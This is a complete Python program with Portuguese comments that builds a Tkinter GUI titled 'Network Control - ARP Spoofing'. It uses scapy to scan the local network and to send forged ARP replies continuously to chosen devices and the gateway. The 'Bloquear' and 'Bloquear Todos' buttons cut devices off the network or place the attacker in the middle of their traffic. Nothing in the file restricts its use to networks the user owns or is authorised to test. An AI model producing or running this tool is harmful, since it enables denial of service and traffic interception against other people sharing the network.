import tkinter as tk
from tkinter import messagebox
from scapy.all import ARP, Ether, srp, send
import socket
import threading
import time


# Backend: Funções de rede e ataque ARP

# Função para obter o IP do gateway automaticamente
def get_gateway_ip():
    local_ip = socket.gethostbyname(socket.gethostname())
    ip_prefix = ".".join(local_ip.split('.')[:-1]) + ".1/24"  # O gateway geralmente é .1 no último octeto

    arp_request = ARP(pdst=ip_prefix)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    for element in answered_list:
        return element[1].psrc  # Retorna o IP do gateway
    return None

# Função para obter o MAC de um IP
def get_mac(ip):
    answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=3, verbose=False)
    for s, r in answered:
        return r[Ether].src
    return None

# Função para escanear a rede e obter dispositivos conectados
def scan_network(network):
    devices = []
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for element in answered_list:
        device = {'ip': element[1].psrc, 'mac': element[1].hwsrc, 'status': 'Conectado'}
        devices.append(device)
    return devices

# Função para spoof de ARP
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

# Função para restaurar ARP
def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if target_mac is None or spoof_mac is None:
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=4, verbose=False)

# Função para iniciar o ataque ARP
def start_attack(target_ip, gateway_ip, attacking):
    if target_ip == gateway_ip:
        return False  # Não pode atacar o gateway

    def attack():
        try:
            while attacking.get(target_ip):
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
                time.sleep(2)
        except Exception as e:
            print("Erro:", e)
    
    attacking[target_ip] = True
    threading.Thread(target=attack, daemon=True).start()
    return True

# Função para parar o ataque ARP
def stop_attack(target_ip, gateway_ip, attacking):
    if target_ip == gateway_ip:
        return False  # Não pode parar o ataque no gateway

    attacking[target_ip] = False
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    return True


# Frontend: Interface gráfica

class NetworkControlApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Network Control - ARP Spoofing")
        self.root.geometry("800x600")
        self.attacking = {}  # Controle de ataques
        self.local_ip = socket.gethostbyname(socket.gethostname())  # IP local
        self.gateway_ip = get_gateway_ip()  # IP do gateway
        self.all_devices = []  # Lista de dispositivos

        # Elementos de interface
        self.device_frame = tk.Frame(root)
        self.device_frame.pack(pady=20)

        self.loading_label = tk.Label(root, text="", fg="orange", font=("Arial", 14))
        self.loading_label.pack(pady=10)

        self.scan_button = tk.Button(root, text="Escanear Rede", command=self.update_device_list)
        self.scan_button.pack(pady=10)

        self.block_all_button = tk.Button(root, text="Bloquear Todos", bg="darkred", fg="white", command=self.block_all_devices)
        self.block_all_button.pack(pady=10)

        self.release_all_button = tk.Button(root, text="Liberar Todos", bg="darkgreen", fg="white", command=self.release_all_devices)
        self.release_all_button.pack(pady=10)

        self.devices_count_label = tk.Label(root, text="Dispositivos Conectados: 0")
        self.devices_count_label.pack(pady=10)

        self.update_device_list()  # Atualiza a lista de dispositivos na inicialização

    def update_device_list(self):
        self.loading_label.config(text="Carregando dispositivos...")
        network = ".".join(self.gateway_ip.split('.')[:3]) + ".1/24"
        new_devices = scan_network(network)

        # Remove os widgets antigos da lista de dispositivos
        for widget in self.device_frame.winfo_children():
            widget.destroy()

        self.all_devices = []  # Limpa a lista de dispositivos
        for idx, device in enumerate(new_devices):
            ip, mac = device['ip'], device['mac']
            status = 'Desconectado' if ip not in [dev['ip'] for dev in new_devices] else 'Conectado'

            device_info = tk.Label(self.device_frame, text=f"{ip} - {mac}", bg="lightgray" if status == 'Desconectado' else "white", fg="black")
            device_info.grid(row=idx, column=0, padx=5, pady=5)

            status_label = tk.Label(self.device_frame, text=status, bg="lightcoral" if status == "Desconectado" else "mediumseagreen", fg="white")
            status_label.grid(row=idx, column=1, padx=5, pady=5)

            # Remover botões de bloquear e liberar para o dispositivo local e o gateway
            if ip != self.local_ip and ip != self.gateway_ip:
                cut_button = tk.Button(self.device_frame, text="🔒 Bloquear", bg="darkred", fg="white", 
                                       command=lambda ip=ip, label=status_label: self.start_attack(ip, label))
                cut_button.grid(row=idx, column=2, padx=5, pady=5)

                release_button = tk.Button(self.device_frame, text="🔓 Liberar", bg="darkgreen", fg="white", 
                                           command=lambda ip=ip, label=status_label: self.stop_attack(ip, label))
                release_button.grid(row=idx, column=3, padx=5, pady=5)

            # Destacar o gateway
            if ip == self.gateway_ip:
                device_info.config(bg="yellow", fg="black")
                status_label.config(bg="gold", fg="black", text="Gateway Padrão")
            
            # Destacar o dispositivo local
            if ip == self.local_ip:
                device_info.config(bg="lightblue", fg="black")
                status_label.config(bg="deepskyblue", fg="black", text="This Device")
            
            device['status_label'] = status_label
            self.all_devices.append(device)

        self.devices_count_label.config(text=f"Dispositivos Conectados: {len(self.all_devices)}")
        self.loading_label.config(text="")

    def start_attack(self, target_ip, status_label):
        if start_attack(target_ip, self.gateway_ip, self.attacking):
            status_label.config(text="Bloqueado", bg="darkred", fg="white")
        else:
            messagebox.showwarning("Aviso", "Não é possível bloquear o gateway ou o dispositivo local.")

    def stop_attack(self, target_ip, status_label):
        if stop_attack(target_ip, self.gateway_ip, self.attacking):
            status_label.config(text="Liberado", bg="green", fg="white")
        else:
            messagebox.showwarning("Aviso", "Não é possível liberar o gateway ou o dispositivo local.")

    def block_all_devices(self):
        for device in self.all_devices:
            if device['ip'] != self.local_ip and device['ip'] != self.gateway_ip:
                self.start_attack(device['ip'], device['status_label'])

    def release_all_devices(self):
        for device in self.all_devices:
            if device['ip'] != self.local_ip and device['ip'] != self.gateway_ip:
                self.stop_attack(device['ip'], device['status_label'])


# Inicialização da interface
if __name__ == "__main__":
    root = tk.Tk()
    app = NetworkControlApp(root)
    root.mainloop()
